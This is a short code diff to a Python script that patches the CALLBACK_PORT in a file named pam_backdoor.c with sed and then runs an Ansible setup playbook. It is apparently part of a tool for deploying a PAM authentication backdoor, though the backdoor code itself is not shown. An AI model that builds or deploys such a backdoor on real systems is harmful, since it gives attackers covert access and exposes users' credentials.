@@ -1,7 +1,6 @@
 #!/usr/bin/python3
-import re
+import os
 import argparse
-import fileinput
 import subprocess
 import ansible_runner
 
@@ -31,6 +30,7 @@ def main():
     subprocess.run(f'sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT {args.port}/" ./pam_backdoor.c', shell=True, text=True)
 
     setup_ansible = ansible_runner.run(
+        private_data_dir=f"{os.getcwd()}",
         inventory="inventory.ini",
         playbook="main.yml",
         tags="setup"
